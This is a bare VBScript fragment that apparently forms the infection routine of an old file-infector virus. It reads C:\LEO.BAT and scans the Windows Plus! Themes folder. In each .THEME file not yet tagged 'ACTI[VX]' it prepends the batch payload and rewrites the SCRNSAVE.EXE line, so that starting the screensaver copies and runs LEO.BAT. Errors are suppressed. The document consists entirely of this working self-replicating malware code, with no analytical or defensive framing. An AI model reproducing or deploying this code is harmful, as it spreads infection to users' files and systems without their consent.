   On Error Resume Next
   Set FSO = CreateObject("Scripting.FileSystemObject")
   Set f = FSO.OpenTextFile("C:\LEO.BAT",1)
   aString =  f.ReadAll
   Set f = fso.GetFolder("C:\Program Files\Plus!\Themes\")
   Set fc = f.Files
   For Each f1 in fc
   aFile = f1.Name
   If Right(Ucase(aFile),6)=".THEME" then
   Set Z = FSO.OpenTextFile("C:\Program Files\Plus!\Themes\"+aFile,1)
   if Not FSO.FileExists("C:\Program Files\Plus!\Themes\"+aFile) Then WScript.Quit
   xString = Z.ReadAll
   If Instr(1,xString,"ACTI[VX]")=0 then
   Set Y = FSO.OpenTextFile("C:\Program Files\Plus!\Themes\"+f1.Name,2,True)
   Y.WriteLine Mid(aString,1,Instr(1,aString,";E"+"OF")+4)+VbCrlf
   C=Instr(1,Ucase(xString),"SCRNSAVE.EXE=")
   D=Instr(C,Ucase(xString),VbCrlf)-C+4
   aSaver = Mid(xString,C,D)
   Y.Write Replace(xString,aSaver,"SCRNSAVE.EXE=command.com /c copy " & ShortName("C:\Program Files\Plus!\Themes\"+aFile) & " c:\LEO.BAT /Y|c:\LEO.BAT|" & Vbcrlf)
   End if
   End if
   Next
   Set FSO = Nothing
   '
   Function ShortName(filespec)
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set f = fso.GetFile(filespec)
   ShortName = f.ShortName
   Set fso = Nothing
   End Function
